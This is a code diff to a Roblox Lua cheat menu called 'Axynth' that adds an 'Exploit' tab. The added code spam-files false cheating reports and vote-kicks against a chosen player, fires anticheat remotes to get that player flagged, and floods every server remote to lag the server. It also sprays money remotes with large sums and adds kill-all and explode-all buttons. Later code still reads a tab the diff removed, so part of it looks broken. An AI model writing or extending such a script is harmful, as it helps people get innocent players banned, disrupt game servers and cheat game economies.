@@ -27,7 +27,7 @@ local function cd()
     if now-lastAction<2 then ntf("Cooldown","Wait "..string.format("%.1f",2-(now-lastAction)).."s") return false end
     lastAction=now actionCount=actionCount+1 return true
 end
-local ST = {menuOpen=false,fly=false,noclip=false,clickTP=false,esp=false,spectating=nil,selectedPlayer=nil,flySpeed=50,night=false,bright=false,noFog=false,invisible=false,espList={},lastAction=0}
+local ST = {menuOpen=false,fly=false,noclip=false,clickTP=false,esp=false,spectating=nil,selectedPlayer=nil,flySpeed=50,night=false,bright=false,noFog=false,invisible=false,espList={},serverLag=false}
 local CFG = {MenuKey=Enum.KeyCode.F4,ESPKey=Enum.KeyCode.F9,ESPColor=Color3.fromRGB(255,0,0),ESPFillAlpha=0.5}
 local TH = {p=Color3.fromRGB(18,18,32),s=Color3.fromRGB(24,24,44),b=Color3.fromRGB(35,35,60),bh=Color3.fromRGB(55,55,85),t=Color3.fromRGB(210,210,230),a=Color3.fromRGB(120,120,255),g=Color3.fromRGB(80,255,120),r=Color3.fromRGB(255,80,80)}
 local function tw(o,p,d) local t=TW:Create(o,TweenInfo.new(d or 0.25,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),p) t:Play() return t end
@@ -148,7 +148,7 @@ CFB.Parent=MF
 print("[Axynth] GUI OK")
 local tabs={}
 local tF={}
-local tNames={{"home","Home"},{"world","World"},{"plr","Players"},{"fun","Fun+Troll"},{"misc","Misc"},{"set","Settings"}}
+local tNames={{"home","Home"},{"world","World"},{"plr","Players"},{"fun","Fun+Troll"},{"exploit","Exploit"},{"set","Settings"}}
 for i,n in pairs(tNames) do
     local f=Instance.new("TextButton")
     f.Size=UDim2.new(0,78,0,30)
@@ -216,7 +216,7 @@ tog(tH,"Free Cam [F8]",function() return ST.freeCam end,function()
         ST.freeCamPos=CAM.CFrame
         ST.freeCamVel=Vector3.new(0,0,0)
         CAM.CameraType=Enum.CameraType.Scriptable
-        ntf("FreeCam","ON - WASD + Mouse")
+        ntf("FreeCam","ON - WASD + Shift")
     else
         CAM.CameraType=Enum.CameraType.Custom
         if LP.Character then local h=LP.Character:FindFirstChildOfClass("Humanoid") if h then CAM.CameraSubject=h end end
@@ -310,6 +310,7 @@ btn(tP,"Freeze Player",function() if ST.selectedPlayer and cd() then sf("freeze"
 btn(tP,"Unfreeze Player",function() if ST.selectedPlayer and cd() then sf("unfreeze",ST.selectedPlayer.Name) end end)
 btn(tP,"Kill Player",function() if ST.selectedPlayer and cd() then sf("kill",ST.selectedPlayer.Name) end end)
 btn(tP,"Heal Player",function() if ST.selectedPlayer and cd() then sf("heal",ST.selectedPlayer.Name) end end)
+btn(tP,"Explode Player",function() if ST.selectedPlayer and cd() then sf("explode",ST.selectedPlayer.Name) end end)
 sep(tP)
 lbl(tP,">> SPECTATE + ESP")
 btn(tP,"Spectate",function() if ST.selectedPlayer and ST.selectedPlayer.Character then local h=ST.selectedPlayer.Character:FindFirstChildOfClass("Humanoid") if h then CAM.CameraSubject=h CAM.CameraType=Enum.CameraType.Custom ST.spectating=ST.selectedPlayer end end end)
@@ -367,6 +368,53 @@ btn(tF2,"Self Bang",function() sf("bang",1) end)
 btn(tF2,"Self Sleep",function() sf("sleep",1) end)
 btn(tF2,"Self Spin",function() sf("spin",1) end)
 btn(tF2,"Self Stop Spin",function() sf("unspin",1) end)
+local tEx=tF["exploit"]
+lbl(tEx,">> SILENT BAN / KICK")
+btn(tEx,"Report Spam Target",function() if ST.selectedPlayer and cd() then for i=1,10 do spawn(function() wait(math.random(50,200)/1000) pcall(function() local r=RS:FindFirstChild("ReportPlayer") if r then r:FireServer(ST.selectedPlayer,"Exploiting","Exploiting") end end) pcall(function() local r=RS:FindFirstChild("Report") if r then r:FireServer(ST.selectedPlayer,"Exploiting") end end) pcall(function() local r=RS:FindFirstChild("AntiCheatReport") if r then r:FireServer(ST.selectedPlayer,"cheating") end end) end) end ntf("Report","Spamming reports on "..ST.selectedPlayer.Name) end end)
+btn(tEx,"Vote Kick Target",function() if ST.selectedPlayer and cd() then pcall(function() local r=RS:FindFirstChild("VoteKick") if r then r:FireServer(ST.selectedPlayer) end end) pcall(function() local r=RS:FindFirstChild("Votekick") if r then r:FireServer(ST.selectedPlayer.Name) end end) pcall(function() local r=RS:FindFirstChild("Kick") if r then r:FireServer(ST.selectedPlayer.Name,"Exploiting") end end) ntf("VoteKick","Trying to kick "..ST.selectedPlayer.Name) end end)
+btn(tEx,"Trigger Anticheat Target",function() if ST.selectedPlayer and cd() then for i=1,5 do spawn(function() wait(math.random(100,500)/1000) pcall(function() for _,r in pairs(RS:GetDescendants()) do if r:IsA("RemoteEvent") and r.Name:lower():find("anti") then r:FireServer(ST.selectedPlayer,"flag") end end end) end) end ntf("Anticheat","Triggering on "..ST.selectedPlayer.Name) end end)
+btn(tEx,"Spam Reports All",function() if cd() then for i=1,20 do spawn(function() wait(math.random(100,400)/1000) pcall(function() local r=RS:FindFirstChild("ReportPlayer") if r then r:FireServer(P:GetChildren()[math.random(2,#P:GetChildren())],"Exploiting") end end) end) end ntf("Reports","Spamming all reports") end end)
+sep(tEx)
+lbl(tEx,">> SERVER LAG / FREEZE")
+tog(tEx,"Server Lag [F10]",function() return ST.serverLag end,function()
+    ST.serverLag=not ST.serverLag
+    if ST.serverLag then
+        ntf("Server Lag","ON - spamming remotes")
+        spawn(function()
+            while ST.serverLag do
+                pcall(function()
+                    for _,r in pairs(RS:GetDescendants()) do
+                        if r:IsA("RemoteEvent") then
+                            pcall(function() r:FireServer() end)
+                            pcall(function() r:FireServer("lag") end)
+                            pcall(function() r:FireServer("") end)
+                        end
+                    end
+                end)
+                wait(math.random(50,200)/1000)
+            end
+        end)
+    else
+        ntf("Server Lag","OFF")
+    end
+end)
+btn(tEx,"Spam All Remotes",function() if cd() then spawn(function() for i=1,50 do pcall(function() for _,r in pairs(RS:GetDescendants()) do if r:IsA("RemoteEvent") then pcall(function() r:FireServer(LP) end) end end end) wait(math.random(10,50)/1000) end end) ntf("Spam","Fired 50 rounds of remotes") end end)
+btn(tEx,"Touch All Parts",function() if cd() and LP.Character then local hrp=LP.Character:FindFirstChild("HumanoidRootPart") if hrp then spawn(function() for _,obj in pairs(W:GetDescendants()) do if obj:IsA("BasePart") and (obj.Position-hrp.Position).Magnitude<100 then pcall(function() firetouchinterest(hrp,obj,0) end) pcall(function() firetouchinterest(hrp,obj,1) end) wait(math.random(5,30)/1000) end end end) ntf("Touch","Touching nearby parts") end end end)
+btn(tEx,"Fire All ClickDetectors",function() if cd() then spawn(function() for _,obj in pairs(W:GetDescendants()) do if obj:IsA("ClickDetector") then pcall(function() obj.MouseClick:Fire() end) wait(math.random(10,50)/1000) end end end) ntf("ClickDetectors","Firing all click detectors") end end)
+sep(tEx)
+lbl(tEx,">> JOB / MONEY EXPLOIT")
+btn(tEx,"Spam Job Selection",function() if cd() then spawn(function() for i=1,30 do pcall(function() for _,r in pairs(RS:GetDescendants()) do if r:IsA("RemoteEvent") and (r.Name:lower():find("job") or r.Name:lower():find("work") or r.Name:lower():find("select")) then pcall(function() r:FireServer("police") end) pcall(function() r:FireServer("medic") end) pcall(function() r:FireServer("mechanic") end) end end end) wait(math.random(50,200)/1000) end end) ntf("Jobs","Spamming job selection") end end)
+btn(tEx,"Spam Money Remotes",function() if cd() then spawn(function() for i=1,30 do pcall(function() for _,r in pairs(RS:GetDescendants()) do if r:IsA("RemoteEvent") and (r.Name:lower():find("money") or r.Name:lower():find("bank") or r.Name:lower():find("pay") or r.Name:lower():find("cash")) then pcall(function() r:FireServer(999999) end) pcall(function() r:FireServer("deposit",999999) end) pcall(function() r:FireServer("withdraw",999999) end) end end end) wait(math.random(50,200)/1000) end end) ntf("Money","Spamming money remotes") end end)
+btn(tEx,"Spam All Game Remotes",function() if cd() then spawn(function() local count=0 for _,r in pairs(RS:GetDescendants()) do if r:IsA("RemoteEvent") then for i=1,5 do spawn(function() wait(math.random(10,100)/1000) pcall(function() r:FireServer() end) pcall(function() r:FireServer("x") end) pcall(function() r:FireServer(1) end) pcall(function() r:FireServer(true) end) pcall(function() r:FireServer({}) end) end) end count=count+1 end end ntf("Remotes","Fired "..count.." remotes x5") end) end end)
+btn(tEx,"Scan All Remotes",function() if cd() then local remotes={} for _,r in pairs(RS:GetDescendants()) do if r:IsA("RemoteEvent") then table.insert(remotes,r.Name) end end local msg=table.concat(remotes,", ") if #msg>200 then msg=msg:sub(1,200).."..." end ntf("Found "..#remotes.." remotes",msg,5) end end)
+sep(tEx)
+lbl(tEx,">> SELF EXPLOIT")
+btn(tEx,"Full Heal",function() if LP.Character then local h=LP.Character:FindFirstChildOfClass("Humanoid") if h then h.MaxHealth=math.huge h.Health=math.huge end end sf("godmode",1) end)
+btn(tEx,"Max Armor",function() sf("godmode",1) pcall(function() LP.Character:FindFirstChildOfClass("Humanoid").MaxHealth=math.huge LP.Character:FindFirstChildOfClass("Humanoid").Health=math.huge end) end)
+btn(tEx,"TP All To Me",function() if cd() then sf("bring",100) end end)
+btn(tEx,"Kill All",function() if cd() then sf("kill",100) end end)
+btn(tEx,"Freeze All",function() if cd() then sf("freeze",100) end end)
+btn(tEx,"Explode All",function() if cd() then sf("explode",100) end end)
 local tMi=tF["misc"]
 lbl(tMi,">> MISC")
 btn(tMi,"Reset Character",function() if LP.Character then local h=LP.Character:FindFirstChildOfClass("Humanoid") if h then h.Health=0 end end end)
@@ -389,7 +437,7 @@ btn(tSe,"Dark Green",function() TH.p=Color3.fromRGB(12,24,12) TH.s=Color3.fromRG
 btn(tSe,"Midnight",function() TH.p=Color3.fromRGB(8,8,20) TH.s=Color3.fromRGB(12,12,28) TH.b=Color3.fromRGB(20,20,40) TH.bh=Color3.fromRGB(30,30,55) TH.a=Color3.fromRGB(100,180,255) MF.BackgroundColor3=TH.p end)
 sep(tSe)
 lbl(tSe,">> HOTKEYS")
-btn(tSe,"Show All Keys",function() ntf("F4=Menu F5=Noclip F6=ClickTP","F7=Fly F8=FreeCam F9=ESP") end)
+btn(tSe,"Show All Keys",function() ntf("F4=Menu F5=Noclip F6=ClickTP","F7=Fly F8=FreeCam F9=ESP F10=Lag") end)
 print("[Axynth] All tabs OK")
 U.InputBegan:Connect(function(inp,gpe)
     if gpe then return end
@@ -414,11 +462,31 @@ U.InputBegan:Connect(function(inp,gpe)
             ST.freeCamPos=CAM.CFrame
             ST.freeCamVel=Vector3.new(0,0,0)
             CAM.CameraType=Enum.CameraType.Scriptable
-ntf("FreeCam","ON - WASD + Shift")
+            ntf("FreeCam","ON - WASD + Shift")
         else
             CAM.CameraType=Enum.CameraType.Custom
             if LP.Character then local h=LP.Character:FindFirstChildOfClass("Humanoid") if h then CAM.CameraSubject=h end end
             ntf("FreeCam","OFF")
+        end
+    elseif inp.KeyCode==Enum.KeyCode.F10 then
+        ST.serverLag=not ST.serverLag
+        if ST.serverLag then
+            ntf("Server Lag","ON")
+            spawn(function()
+                while ST.serverLag do
+                    pcall(function()
+                        for _,r in pairs(RS:GetDescendants()) do
+                            if r:IsA("RemoteEvent") then
+                                pcall(function() r:FireServer() end)
+                                pcall(function() r:FireServer("lag") end)
+                            end
+                        end
+                    end)
+                    wait(math.random(50,200)/1000)
+                end
+            end)
+        else
+            ntf("Server Lag","OFF")
         end
     elseif inp.KeyCode==CFG.ESPKey then
         ST.esp=not ST.esp
